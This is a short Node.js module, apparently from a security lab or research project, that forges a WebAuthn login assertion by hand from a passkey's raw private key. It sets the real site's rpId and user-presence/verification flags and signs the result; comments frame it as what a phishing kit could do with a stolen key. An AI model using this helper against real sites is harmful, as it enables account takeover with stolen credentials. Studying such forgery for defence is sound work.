// Builds a WebAuthn assertion by hand from a passkey's raw private key: what a phishing
// kit could do if it ever got the key. Used by attack3.mjs.
import { createHash, createPrivateKey, createPublicKey, sign, verify } from "node:crypto";

export const b64url = (buf) => Buffer.from(buf).toString("base64url");
const sha256 = (data) => createHash("sha256").update(data).digest();

/**
 * @param {object} o
 * @param {string} o.privateKeyPkcs8  base64 PKCS#8 DER (as returned by CDP WebAuthn.getCredentials)
 * @param {string} o.credentialId     base64url credential id
 * @param {string|null} o.userHandle  base64url user handle (discoverable credential)
 * @param {string} o.rpId             rpID baked into authenticatorData (the REAL site's)
 * @param {string} o.challenge        base64url challenge from the real site's login/options
 * @param {string} o.origin           origin written into clientDataJSON (and therefore signed)
 * @param {number} o.signCount
 * @returns {{ response: object, signatureValid: boolean }}
 */
export function forgeAssertion({ privateKeyPkcs8, credentialId, userHandle, rpId, challenge, origin, signCount }) {
  const key = createPrivateKey({ key: Buffer.from(privateKeyPkcs8, "base64"), format: "der", type: "pkcs8" });
  const clientDataJSON = Buffer.from(
    JSON.stringify({ type: "webauthn.get", challenge, origin, crossOrigin: false }),
    "utf8",
  );
  const counter = Buffer.alloc(4);
  counter.writeUInt32BE(signCount >>> 0);
  // rpIdHash | flags (UP 0x01 + UV 0x04) | signCount
  const authenticatorData = Buffer.concat([sha256(rpId), Buffer.from([0x05]), counter]);
  const signed = Buffer.concat([authenticatorData, sha256(clientDataJSON)]);
  const signature = sign("sha256", signed, key); // ECDSA P-256, DER encoded, as WebAuthn expects
  const signatureValid = verify("sha256", signed, createPublicKey(key), signature);
  return {
    signatureValid,
    response: {
      id: credentialId,
      rawId: credentialId,
      type: "public-key",
      authenticatorAttachment: "platform",
      clientExtensionResults: {},
      response: {
        clientDataJSON: b64url(clientDataJSON),
        authenticatorData: b64url(authenticatorData),
        signature: b64url(signature),
        ...(userHandle ? { userHandle } : {}),
      },
    },
  };
}
